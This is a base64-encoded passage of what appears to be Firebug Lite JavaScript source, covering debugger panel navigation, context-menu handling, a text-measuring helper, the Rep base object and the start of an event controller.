HJldHVybiAxOw0KICAgICAgICAgICAgaWYobG9jQS5uYW1lIDwgbG9jQi5uYW1lKQ0KICAgICAgICAgICAgICAgIHJldHVybiAtMTsNCiAgICAgICAgICAgIHJldHVybiAwOw0KICAgICAgICB9DQogICAgICAgIHZhciBhbGxMb2NzID0gdGhpcy5nZXRMb2NhdGlvbkxpc3QoKS5zb3J0KGNvbXBhcmUpOw0KICAgICAgICBmb3IgKHZhciBjdXJQb3MgPSAwOyBjdXJQb3MgPCBhbGxMb2NzLmxlbmd0aCAmJiBhbGxMb2NzW2N1clBvc10gIT0gdGhpcy5sb2NhdGlvbjsgY3VyUG9zKyspOw0KDQogICAgICAgIGZ1bmN0aW9uIHRyYW5zZm9ybUluZGV4KGluZGV4KSB7DQogICAgICAgICAgICBpZiAocmV2ZXJzZSkgew0KICAgICAgICAgICAgICAgIC8vIEZvciB0aGUgcmV2ZXJzZSBjYXNlIHdlIG5lZWQgdG8gaW1wbGVtZW50IHdyYXAgYXJvdW5kLg0KICAgICAgICAgICAgICAgIHZhciBpbnRlcm1lZGlhdGUgPSBjdXJQb3MgLSBpbmRleCAtIDE7DQogICAgICAgICAgICAgICAgcmV0dXJuIChpbnRlcm1lZGlhdGUgPCAwID8gYWxsTG9jcy5sZW5ndGggOiAwKSArIGludGVybWVkaWF0ZTsNCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgcmV0dXJuIChjdXJQb3MgKyBpbmRleCArIDEpICUgYWxsTG9jcy5sZW5ndGg7DQogICAgICAgICAgICB9DQogICAgICAgIH07DQoNCiAgICAgICAgZm9yICh2YXIgbmV4dCA9IDA7IG5leHQgPCBhbGxMb2NzLmxlbmd0aCAtIDE7IG5leHQrKykNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIG9iamVjdCA9IGFsbExvY3NbdHJhbnNmb3JtSW5kZXgobmV4dCldOw0KDQogICAgICAgICAgICBpZiAobWF0Y2gob2JqZWN0KSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB0aGlzLm5hdmlnYXRlKG9iamVjdCk7DQogICAgICAgICAgICAgICAgcmV0dXJuIG9iamVjdDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0sDQoNCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCiAgICAvLyBDYWxsZWQgd2hlbiAiT3B0aW9ucyIgY2xpY2tlZC4gUmV0dXJuIGFycmF5IG9mDQogICAgLy8ge2xhYmVsOiAnbmFtZScsIG5vbDEwbjogdHJ1ZSwgIHR5cGU6ICJjaGVja2JveCIsIGNoZWNrZWQ6IDx2YWx1ZT4sIGNvbW1hbmQ6ZnVuY3Rpb24gdG8gc2V0IDx2YWx1ZT59DQogICAgZ2V0T3B0aW9uc01lbnVJdGVtczogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIG51bGw7DQogICAgfSwNCg0KICAgIC8qDQogICAgICogQ2FsbGVkIGJ5IGNocm9tZS5vbkNvbnRleHRNZW51IHRvIGJ1aWxkIHRoZSBjb250ZXh0IG1lbnUgd2hlbiB0aGlzIHBhbmVsIGhhcyBmb2N1cy4NCiAgICAgKiBTZWUgYWxzbyBGaXJlYnVnUmVwIGZvciBhIHNpbWlsYXIgZnVuY3Rpb24gYWxzbyBjYWxsZWQgYnkgb25Db250ZXh0TWVudQ0KICAgICAqIEV4dGVuc2lvbnMgbWF5IG1vbmtleSBwYXRjaCBhbmQgY2hhaW4gb2ZmIHRoaXMgY2FsbA0KICAgICAqIEBwYXJhbSBvYmplY3Q6IHRoZSAncmVhbE9iamVjdCcsIGEgbW9kZWwgdmFsdWUsIGVnIGEgRE9NIHByb3BlcnR5DQogICAgICogQHBhcmFtIHRhcmdldDogdGhlIEhUTUwgZWxlbWVudCBjbGlja2VkIG9uLg0KICAgICAqIEByZXR1cm4gYW4gYXJyYXkgb2YgbWVudSBpdGVtcy4NCiAgICAgKi8NCiAgICBnZXRDb250ZXh0TWVudUl0ZW1zOiBmdW5jdGlvbihvYmplY3QsIHRhcmdldCkNCiAgICB7DQogICAgICAgIHJldHVybiBbXTsNCiAgICB9LA0KDQogICAgZ2V0QnJlYWtPbk1lbnVJdGVtczogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIFtdOw0KICAgIH0sDQoNCiAgICBnZXRFZGl0b3I6IGZ1bmN0aW9uKHRhcmdldCwgdmFsdWUpDQogICAgew0KICAgIH0sDQoNCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCiAgICBnZXREZWZhdWx0U2VsZWN0aW9uOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICByZXR1cm4gbnVsbDsNCiAgICB9LA0KDQogICAgYnJvd3NlT2JqZWN0OiBmdW5jdGlvbihvYmplY3QpDQogICAgew0KICAgIH0sDQoNCiAgICBnZXRQb3B1cE9iamVjdDogZnVuY3Rpb24odGFyZ2V0KQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIEZpcmVidWcuZ2V0UmVwT2JqZWN0KHRhcmdldCk7DQogICAgfSwNCg0KICAgIGdldFRvb2x0aXBPYmplY3Q6IGZ1bmN0aW9uKHRhcmdldCkNCiAgICB7DQogICAgICAgIHJldHVybiBGaXJlYnVnLmdldFJlcE9iamVjdCh0YXJnZXQpOw0KICAgIH0sDQoNCiAgICBzaG93SW5mb1RpcDogZnVuY3Rpb24oaW5mb1RpcCwgeCwgeSkNCiAgICB7DQoNCiAgICB9LA0KDQogICAgZ2V0T2JqZWN0UGF0aDogZnVuY3Rpb24ob2JqZWN0KQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIG51bGw7DQogICAgfSwNCg0KICAgIC8vIEFuIGFycmF5IG9mIG9iamVjdHMgdGhhdCBjYW4gYmUgcGFzc2VkIHRvIGdldE9iamVjdExvY2F0aW9uLg0KICAgIC8vIFRoZSBsaXN0IG9mIHRoaW5ncyBhIHBhbmVsIGNhbiBzaG93LCBlZyBzb3VyY2VGaWxlcy4NCiAgICAvLyBPbmx5IHNob3duIGlmIHBhbmVsLmxvY2F0aW9uIGRlZmluZWQgYW5kIHN1cHBvcnRzT2JqZWN0IHRydWUNCiAgICBnZXRMb2NhdGlvbkxpc3Q6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHJldHVybiBudWxsOw0KICAgIH0sDQoNCiAgICBnZXREZWZhdWx0TG9jYXRpb246IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHJldHVybiBudWxsOw0KICAgIH0sDQoNCiAgICBnZXRPYmplY3RMb2NhdGlvbjogZnVuY3Rpb24ob2JqZWN0KQ0KICAgIHsNCiAgICAgICAgcmV0dXJuICIiOw0KICAgIH0sDQoNCiAgICAvLyBUZXh0IGZvciB0aGUgbG9jYXRpb24gbGlzdCBtZW51IGVnIHNjcmlwdCBwYW5lbCBzb3VyY2UgZmlsZSBsaXN0DQogICAgLy8gcmV0dXJuLnBhdGg6IGdyb3VwL2NhdGVnb3J5IGxhYmVsLCByZXR1cm4ubmFtZTogaXRlbSBsYWJlbA0KICAgIGdldE9iamVjdERlc2NyaXB0aW9uOiBmdW5jdGlvbihvYmplY3QpDQogICAgew0KICAgICAgICB2YXIgdXJsID0gdGhpcy5nZXRPYmplY3RMb2NhdGlvbihvYmplY3QpOw0KICAgICAgICByZXR1cm4gRkJMLnNwbGl0VVJMQmFzZSh1cmwpOw0KICAgIH0sDQoNCiAgICAvKg0KICAgICAqICBVSSBzaWduYWwgdGhhdCBhIHRhYiBuZWVkcyBhdHRlbnRpb24sIGVnIFNjcmlwdCBwYW5lbCBpcyBjdXJyZW50bHkgc3RvcHBlZCBvbiBhIGJyZWFrcG9pbnQNCiAgICAgKiAgQHBhcmFtOiBzaG93IGJvb2xlYW4sIHRydWUgdHVybnMgb24uDQogICAgICovDQogICAgaGlnaGxpZ2h0OiBmdW5jdGlvbihzaG93KQ0KICAgIHsNCiAgICAgICAgdmFyIHRhYiA9IHRoaXMuZ2V0VGFiKCk7DQogICAgICAgIGlmICghdGFiKQ0KICAgICAgICAgICAgcmV0dXJuOw0KDQogICAgICAgIGlmIChzaG93KQ0KICAgICAgICAgICAgdGFiLnNldEF0dHJpYnV0ZSgiaGlnaGxpZ2h0IiwgInRydWUiKTsNCiAgICAgICAgZWxzZQ0KICAgICAgICAgICAgdGFiLnJlbW92ZUF0dHJpYnV0ZSgiaGlnaGxpZ2h0Iik7DQogICAgfSwNCg0KICAgIGdldFRhYjogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgdmFyIGNocm9tZSA9IEZpcmVidWcuY2hyb21lOw0KDQogICAgICAgIHZhciB0YWIgPSBjaHJvbWUuJCgiZmJQYW5lbEJhcjIiKS5nZXRUYWIodGhpcy5uYW1lKTsNCiAgICAgICAgaWYgKCF0YWIpDQogICAgICAgICAgICB0YWIgPSBjaHJvbWUuJCgiZmJQYW5lbEJhcjEiKS5nZXRUYWIodGhpcy5uYW1lKTsNCiAgICAgICAgcmV0dXJuIHRhYjsNCiAgICB9LA0KDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgIC8vIFN1cHBvcnQgZm9yIEJyZWFrIE9uIE5leHQNCg0KICAgIC8qKg0KICAgICAqIENhbGxlZCBieSB0aGUgZnJhbWV3b3JrIHdoZW4gdGhlIHVzZXIgY2xpY2tzIG9uIHRoZSBCcmVhayBPbiBOZXh0IGJ1dHRvbi4NCiAgICAgKiBAcGFyYW0ge0Jvb2xlYW59IGFybWVkIFNldCB0byB0cnVlIGlmIHRoZSBCcmVhayBPbiBOZXh0IGZlYXR1cmUgaXMNCiAgICAgKiB0byBiZSBhcm1lZCBmb3IgYWN0aW9uIGFuZCBzZXQgdG8gZmFsc2UgaWYgdGhlIEJyZWFrIE9uIE5leHQgc2hvdWxkIGJlIGRpc2FybWVkLg0KICAgICAqIElmICdhcm1lZCcgaXMgdHJ1ZSwgdGhlbiB0aGUgbmV4dCBjYWxsIHRvIHNob3VsZEJyZWFrT25OZXh0IHNob3VsZCBiZSB8dHJ1ZXwuDQogICAgICovDQogICAgYnJlYWtPbk5leHQ6IGZ1bmN0aW9uKGFybWVkKQ0KICAgIHsNCiAgICB9LA0KDQogICAgLyoqDQogICAgICogQ2FsbGVkIHdoZW4gYSBwYW5lbCBpcyBzZWxlY3RlZC9kaXNwbGF5ZWQuIFRoZSBtZXRob2Qgc2hvdWxkIHJldHVybiB0cnVlDQogICAgICogaWYgdGhlIEJyZWFrIE9uIE5leHQgZmVhdHVyZSBpcyBjdXJyZW50bHkgYXJtZWQgZm9yIHRoaXMgcGFuZWwuDQogICAgICovDQogICAgc2hvdWxkQnJlYWtPbk5leHQ6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHJldHVybiBmYWxzZTsNCiAgICB9LA0KDQogICAgLyoqDQogICAgICogUmV0dXJucyBsYWJlbHMgZm9yIEJyZWFrIE9uIE5leHQgdG9vbHRpcCAob25lIGZvciBlbmFibGVkIGFuZCBvbmUgZm9yIGRpc2FibGVkIHN0YXRlKS4NCiAgICAgKiBAcGFyYW0ge0Jvb2xlYW59IGVuYWJsZWQgU2V0IHRvIHRydWUgaWYgdGhlIEJyZWFrIE9uIE5leHQgZmVhdHVyZSBpcw0KICAgICAqIGN1cnJlbnRseSBhY3RpdmF0ZWQgZm9yIHRoaXMgcGFuZWwuDQogICAgICovDQogICAgZ2V0QnJlYWtPbk5leHRUb29sdGlwOiBmdW5jdGlvbihlbmFibGVkKQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIG51bGw7DQogICAgfSwNCg0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICANCiAgICAvLyB4eHhwZWRybyBjb250ZXh0TWVudQ0KICAgIG9uQ29udGV4dE1lbnU6IGZ1bmN0aW9uKGV2ZW50KQ0KICAgIHsNCiAgICAgICAgaWYgKCF0aGlzLmdldENvbnRleHRNZW51SXRlbXMpDQogICAgICAgICAgICByZXR1cm47DQogICAgICAgIA0KICAgICAgICBjYW5jZWxFdmVudChldmVudCwgdHJ1ZSk7DQoNCiAgICAgICAgdmFyIHRhcmdldCA9IGV2ZW50LnRhcmdldCB8fCBldmVudC5zcmNFbGVtZW50Ow0KICAgICAgICANCiAgICAgICAgdmFyIG1lbnUgPSB0aGlzLmdldENvbnRleHRNZW51SXRlbXModGhpcy5zZWxlY3Rpb24sIHRhcmdldCk7DQogICAgICAgIGlmICghbWVudSkgDQogICAgICAgICAgICByZXR1cm47DQogICAgICAgIA0KICAgICAgICB2YXIgY29udGV4dE1lbnUgPSBuZXcgTWVudSgNCiAgICAgICAgew0KICAgICAgICAgICAgaWQ6ICJmYlBhbmVsQ29udGV4dE1lbnUiLA0KICAgICAgICAgICAgDQogICAgICAgICAgICBpdGVtczogbWVudQ0KICAgICAgICB9KTsNCiAgICAgICAgDQogICAgICAgIGNvbnRleHRNZW51LnNob3coZXZlbnQuY2xpZW50WCwgZXZlbnQuY2xpZW50WSk7DQogICAgICAgIA0KICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgDQogICAgICAgIC8qDQogICAgICAgIC8vIFRPRE86IHh4eHBlZHJvIG1vdmUgY29kZSB0byBzb21ld2hlcmUuIGNvZGUgdG8gZ2V0IGNyb3NzLWJyb3dzZXINCiAgICAgICAgLy8gd2luZG93IHRvIHNjcmVlbiBjb29yZGluYXRlcw0KICAgICAgICB2YXIgYm94ID0gRmlyZWJ1Zy5icm93c2VyLmdldEVsZW1lbnRQb3NpdGlvbihGaXJlYnVnLmNocm9tZS5ub2RlKTsNCiAgICAgICAgDQogICAgICAgIHZhciBzY3JlZW5ZID0gMDsNCiAgICAgICAgDQogICAgICAgIC8vIEZpcmVmb3gNCiAgICAgICAgaWYgKHR5cGVvZiB3aW5kb3cubW96SW5uZXJTY3JlZW5ZICE9ICJ1bmRlZmluZWQiKQ0KICAgICAgICB7DQogICAgICAgICAgICBzY3JlZW5ZID0gd2luZG93Lm1veklubmVyU2NyZWVuWTsgDQogICAgICAgIH0NCiAgICAgICAgLy8gQ2hyb21lDQogICAgICAgIGVsc2UgaWYgKHR5cGVvZiB3aW5kb3cuaW5uZXJIZWlnaHQgIT0gInVuZGVmaW5lZCIpDQogICAgICAgIHsNCiAgICAgICAgICAgIHNjcmVlblkgPSB3aW5kb3cub3V0ZXJIZWlnaHQgLSB3aW5kb3cuaW5uZXJIZWlnaHQ7DQogICAgICAgIH0NCiAgICAgICAgLy8gSUUNCiAgICAgICAgZWxzZSBpZiAodHlwZW9mIHdpbmRvdy5zY3JlZW5Ub3AgIT0gInVuZGVmaW5lZCIpDQogICAgICAgIHsNCiAgICAgICAgICAgIHNjcmVlblkgPSB3aW5kb3cuc2NyZWVuVG9wOw0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICBjb250ZXh0TWVudS5zaG93KGV2ZW50LnNjcmVlblgtYm94LmxlZnQsIGV2ZW50LnNjcmVlblktc2NyZWVuWS1ib3gudG9wKTsNCiAgICAgICAgLyoqLw0KICAgIH0NCiAgICANCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQp9Ow0KDQoNCi8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KLyoqDQogKiBNZWFzdXJlQm94DQogKiBUbyBnZXQgcGl4ZWxzIHNpemUud2lkdGggYW5kIHNpemUuaGVpZ2h0Og0KICogPHVsPjxsaT4gICAgIHRoaXMuc3RhcnRNZWFzdXJpbmcodmlldyk7IDwvbGk+DQogKiAgICAgPGxpPiAgICAgdmFyIHNpemUgPSB0aGlzLm1lYXN1cmVUZXh0KGxpbmVOb0NoYXJzU3BhY2VyKTsgPC9saT4NCiAqICAgICA8bGk+ICAgICB0aGlzLnN0b3BNZWFzdXJpbmcoKTsgPC9saT4NCiAqIDwvdWw+DQogKiAgDQogKiBAbmFtZXNwYWNlDQogKi8NCkZpcmVidWcuTWVhc3VyZUJveCA9DQp7DQogICAgc3RhcnRNZWFzdXJpbmc6IGZ1bmN0aW9uKHRhcmdldCkNCiAgICB7DQogICAgICAgIGlmICghdGhpcy5tZWFzdXJlQm94KQ0KICAgICAgICB7DQogICAgICAgICAgICB0aGlzLm1lYXN1cmVCb3ggPSB0YXJnZXQub3duZXJEb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzcGFuIik7DQogICAgICAgICAgICB0aGlzLm1lYXN1cmVCb3guY2xhc3NOYW1lID0gIm1lYXN1cmVCb3giOw0KICAgICAgICB9DQoNCiAgICAgICAgY29weVRleHRTdHlsZXModGFyZ2V0LCB0aGlzLm1lYXN1cmVCb3gpOw0KICAgICAgICB0YXJnZXQub3duZXJEb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHRoaXMubWVhc3VyZUJveCk7DQogICAgfSwNCg0KICAgIGdldE1lYXN1cmluZ0VsZW1lbnQ6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHJldHVybiB0aGlzLm1lYXN1cmVCb3g7DQogICAgfSwNCg0KICAgIG1lYXN1cmVUZXh0OiBmdW5jdGlvbih2YWx1ZSkNCiAgICB7DQogICAgICAgIHRoaXMubWVhc3VyZUJveC5pbm5lckhUTUwgPSB2YWx1ZSA/IGVzY2FwZUZvclNvdXJjZUxpbmUodmFsdWUpIDogIm0iOw0KICAgICAgICByZXR1cm4ge3dpZHRoOiB0aGlzLm1lYXN1cmVCb3gub2Zmc2V0V2lkdGgsIGhlaWdodDogdGhpcy5tZWFzdXJlQm94Lm9mZnNldEhlaWdodC0xfTsNCiAgICB9LA0KDQogICAgbWVhc3VyZUlucHV0VGV4dDogZnVuY3Rpb24odmFsdWUpDQogICAgew0KICAgICAgICB2YWx1ZSA9IHZhbHVlID8gZXNjYXBlRm9yVGV4dE5vZGUodmFsdWUpIDogIm0iOw0KICAgICAgICBpZiAoIUZpcmVidWcuc2hvd1RleHROb2Rlc1dpdGhXaGl0ZXNwYWNlKQ0KICAgICAgICAgICAgdmFsdWUgPSB2YWx1ZS5yZXBsYWNlKC9cdC9nLCdtbW1tbW0nKS5yZXBsYWNlKC9cIC9nLCdtJyk7DQogICAgICAgIHRoaXMubWVhc3VyZUJveC5pbm5lckhUTUwgPSB2YWx1ZTsNCiAgICAgICAgcmV0dXJuIHt3aWR0aDogdGhpcy5tZWFzdXJlQm94Lm9mZnNldFdpZHRoLCBoZWlnaHQ6IHRoaXMubWVhc3VyZUJveC5vZmZzZXRIZWlnaHQtMX07DQogICAgfSwNCg0KICAgIGdldEJveDogZnVuY3Rpb24odGFyZ2V0KQ0KICAgIHsNCiAgICAgICAgdmFyIHN0eWxlID0gdGhpcy5tZWFzdXJlQm94Lm93bmVyRG9jdW1lbnQuZGVmYXVsdFZpZXcuZ2V0Q29tcHV0ZWRTdHlsZSh0aGlzLm1lYXN1cmVCb3gsICIiKTsNCiAgICAgICAgdmFyIGJveCA9IGdldEJveEZyb21TdHlsZXMoc3R5bGUsIHRoaXMubWVhc3VyZUJveCk7DQogICAgICAgIHJldHVybiBib3g7DQogICAgfSwNCg0KICAgIHN0b3BNZWFzdXJpbmc6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHRoaXMubWVhc3VyZUJveC5wYXJlbnROb2RlLnJlbW92ZUNoaWxkKHRoaXMubWVhc3VyZUJveCk7DQogICAgfQ0KfTsNCg0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCmlmIChGQkwuZG9tcGxhdGUpIEZpcmVidWcuUmVwID0gZG9tcGxhdGUoDQp7DQogICAgY2xhc3NOYW1lOiAiIiwNCiAgICBpbnNwZWN0YWJsZTogdHJ1ZSwNCg0KICAgIHN1cHBvcnRzT2JqZWN0OiBmdW5jdGlvbihvYmplY3QsIHR5cGUpDQogICAgew0KICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgfSwNCg0KICAgIGluc3BlY3RPYmplY3Q6IGZ1bmN0aW9uKG9iamVjdCwgY29udGV4dCkNCiAgICB7DQogICAgICAgIEZpcmVidWcuY2hyb21lLnNlbGVjdChvYmplY3QpOw0KICAgIH0sDQoNCiAgICBicm93c2VPYmplY3Q6IGZ1bmN0aW9uKG9iamVjdCwgY29udGV4dCkNCiAgICB7DQogICAgfSwNCg0KICAgIHBlcnNpc3RPYmplY3Q6IGZ1bmN0aW9uKG9iamVjdCwgY29udGV4dCkNCiAgICB7DQogICAgfSwNCg0KICAgIGdldFJlYWxPYmplY3Q6IGZ1bmN0aW9uKG9iamVjdCwgY29udGV4dCkNCiAgICB7DQogICAgICAgIHJldHVybiBvYmplY3Q7DQogICAgfSwNCg0KICAgIGdldFRpdGxlOiBmdW5jdGlvbihvYmplY3QpDQogICAgew0KICAgICAgICB2YXIgbGFiZWwgPSBzYWZlVG9TdHJpbmcob2JqZWN0KTsNCg0KICAgICAgICB2YXIgcmUgPSAvXFtvYmplY3QgKC4qPylcXS87DQogICAgICAgIHZhciBtID0gcmUuZXhlYyhsYWJlbCk7DQogICAgICAgIA0KICAgICAgICAvLy9yZXR1cm4gbSA/IG1bMV0gOiBsYWJlbDsNCiAgICAgICAgDQogICAgICAgIC8vIGlmIHRoZSBsYWJlbCBpcyBpbiB0aGUgIltvYmplY3QgVFlQRV0iIGZvcm1hdCByZXR1cm4gaXRzIHR5cGUNCiAgICAgICAgaWYgKG0pDQogICAgICAgIHsNCiAgICAgICAgICAgIHJldHVybiBtWzFdOw0KICAgICAgICB9DQogICAgICAgIC8vIGlmIGl0IGlzIElFIHdlIG5lZWQgdG8gaGFuZGxlIHNvbWUgc3BlY2lhbCBjYXNlcw0KICAgICAgICBlbHNlIGlmICgNCiAgICAgICAgICAgICAgICAvLyBzYWZlVG9TdHJpbmcoKSBmYWlscyB0byByZWNvZ25pemUgc29tZSBvYmplY3RzIGluIElFDQogICAgICAgICAgICAgICAgaXNJRSAmJiANCiAgICAgICAgICAgICAgICAvLyBzYWZlVG9TdHJpbmcoKSByZXR1cm5zICJbb2JqZWN0XSIgZm9yIHNvbWUgb2JqZWN0cyBsaWtlIHdpbmRvdy5JbWFnZSANCiAgICAgICAgICAgICAgICAobGFiZWwgPT0gIltvYmplY3RdIiB8fCANCiAgICAgICAgICAgICAgICAvLyBzYWZlVG9TdHJpbmcoKSByZXR1cm5zIHVuZGVmaW5lZCBmb3Igc29tZSBvYmplY3RzIGxpa2Ugd2luZG93LmNsaWVudEluZm9ybWF0aW9uIA0KICAgICAgICAgICAgICAgIHR5cGVvZiBvYmplY3QgPT0gIm9iamVjdCIgJiYgdHlwZW9mIGxhYmVsID09ICJ1bmRlZmluZWQiKQ0KICAgICAgICAgICAgKQ0KICAgICAgICB7DQogICAgICAgICAgICByZXR1cm4gIk9iamVjdCI7DQogICAgICAgIH0NCiAgICAgICAgZWxzZQ0KICAgICAgICB7DQogICAgICAgICAgICByZXR1cm4gbGFiZWw7DQogICAgICAgIH0NCiAgICB9LA0KDQogICAgZ2V0VG9vbHRpcDogZnVuY3Rpb24ob2JqZWN0KQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIG51bGw7DQogICAgfSwNCg0KICAgIGdldENvbnRleHRNZW51SXRlbXM6IGZ1bmN0aW9uKG9iamVjdCwgdGFyZ2V0LCBjb250ZXh0KQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIFtdOw0KICAgIH0sDQoNCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQogICAgLy8gQ29udmVuaWVuY2UgZm9yIGRvbXBsYXRlcw0KDQogICAgU1RSOiBmdW5jdGlvbihuYW1lKQ0KICAgIHsNCiAgICAgICAgcmV0dXJuICRTVFIobmFtZSk7DQogICAgfSwNCg0KICAgIGNyb3BTdHJpbmc6IGZ1bmN0aW9uKHRleHQpDQogICAgew0KICAgICAgICByZXR1cm4gY3JvcFN0cmluZyh0ZXh0KTsNCiAgICB9LA0KDQogICAgY3JvcE11bHRpcGxlTGluZXM6IGZ1bmN0aW9uKHRleHQsIGxpbWl0KQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIGNyb3BNdWx0aXBsZUxpbmVzKHRleHQsIGxpbWl0KTsNCiAgICB9LA0KDQogICAgdG9Mb3dlckNhc2U6IGZ1bmN0aW9uKHRleHQpDQogICAgew0KICAgICAgICByZXR1cm4gdGV4dCA/IHRleHQudG9Mb3dlckNhc2UoKSA6IHRleHQ7DQogICAgfSwNCg0KICAgIHBsdXJhbDogZnVuY3Rpb24obikNCiAgICB7DQogICAgICAgIHJldHVybiBuID09IDEgPyAiIiA6ICJzIjsNCiAgICB9DQp9KTsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQoNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQp9fSk7DQoNCi8qIFNlZSBsaWNlbnNlLnR4dCBmb3IgdGVybXMgb2YgdXNhZ2UgKi8NCg0KRkJMLm5zKCAvKiogQHNjb3BlIHNfZ3VpICovIGZ1bmN0aW9uKCkgeyB3aXRoIChGQkwpIHsNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vIENvbnRyb2xsZXINCg0KLyoqQG5hbWVzcGFjZSovDQpGQkwuQ29udHJvbGxlciA9IHsNCiAgICAgICAgDQogICAgY29udHJvbGxlcnM6IG51bGwsDQogICAgY29udHJvbGxlckNvbnRleHQ6IG51bGwsDQogICAgDQogICAgaW5pdGlhbGl6ZTogZnVuY3Rpb24oY29udGV4dCkNCiAgICB7DQogICAgICAgIHRoaXMuY29udHJvbGxlcnMgPSBbXTsNCiAgICAgICAgdGhpcy5jb250cm9sbGVyQ29udGV4dCA9IGNvbnRleHQgfHwgRmlyZWJ1Zy5jaHJvbWU7DQogICAgfSwNCiAgICANCiAgICBzaHV0ZG93bjogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgdGhpcy5yZW1vdmVDb250cm9sbGVycygpOw0KICAgICAgICANCiAgICAgICAgLy90aGlzLmNvbnRyb2xsZXJzID0gbnVsbDsNCiAgICAgICAgLy90aGlzLmNvbnRyb2xsZXJDb250ZXh0ID0gbnVsbDsNCiAgICB9LA0KICAgIA0KICAgIGFkZENvbnRyb2xsZXI6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIGZvciAodmFyIGk9MCwgYXJnOyBhcmc9YXJndW1lbnRzW2ldOyBpKyspDQogICAgICAgIHsNCiAgICAgICAgICAgIC8vIElmIHRoZSBmaXJzdCBhcmd1bWVudCBpcyBhIHN0cmluZywgbWFrZSBhIHNlbGVjdG9yIHF1ZXJ5IA0KICAgICAgICAgICAgLy8gd2l0aGluIHRoZSBjb250cm9sbGVyIG5vZGUgY29udGV4dA0KICAgICAgICAgICAgaWYgKHR5cGVvZiBhcmdbMF0gPT0gInN0cmluZyIpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgYXJnWzBdID0gJCQoYXJnWzBdLCB0aGlzLmNvbnRyb2xsZXJDb250ZXh0KTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8gYmluZCB0aGUgaGFuZGxlciB0byB0aGUgcHJvcGVyIGNvbnRleHQNCiAgICAgICAgICAgIHZhciBoYW5kbGVyID0gYXJnWzJdOw0KICAgICAgICAgICAgYXJnWzJdID0gYmluZChoYW5kbGVyLCB0aGlzKTsNCiAgICAgICAgICAgIC8vIHNhdmUgdGhlIG9yaWdpbmFsIGhhbmRsZXIgYXMgYW4gZXh0cmEtYXJndW1lbnQsIHNvIHdlIGNhbg0KICAgICAgICAgICAgLy8gbG9vayBmb3IgaXQgbGF0ZXIsIHdoZW4gcmVtb3ZpbmcgYSBwYXJ0aWN1bGFyIGNvbnRyb2xsZXIgICAgICAgICAgICANCiAgICAgICAgICAgIGFyZ1szXSA9IGhhbmRsZXI7DQogICAgICAgICAgICANCiAgICAgICAgICAgIHRoaXMuY29udHJvbGxlcnMucHVzaChhcmcpOw0KICAgICAgICAgICAgYWRkRXZlbnQuYXBwbHkodGhpcywgYXJ